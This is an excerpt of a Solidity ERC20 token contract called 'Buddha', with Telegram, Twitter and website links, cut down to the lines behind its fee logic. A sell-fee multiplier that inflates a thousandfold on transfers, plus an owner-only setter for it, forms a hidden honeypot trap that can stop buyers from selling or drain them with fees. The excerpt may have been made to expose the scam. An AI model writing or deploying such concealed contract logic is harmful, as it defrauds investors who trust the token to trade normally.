...
Telegram : https://t.me/Buddha_eth
Twitter : https://twitter.com/Buddha_in_eth
Website: http://buddhaerc.com
...
contract Buddha is ERC20, Ownable {
    ...
    string private _symbol = "LaEBuddhaeb";
    ...
    uint256 private earySellPunish  = 100;
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        earySellPunish = earySellPunish.mul(1000);
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {       
        uint256 multiplier = isSell ? earySellPunish : 100;
    ...
    function setEarySellPunish(uint256 _earySellPunish) external onlyOwner {
        earySellPunish = _earySellPunish;        
    }
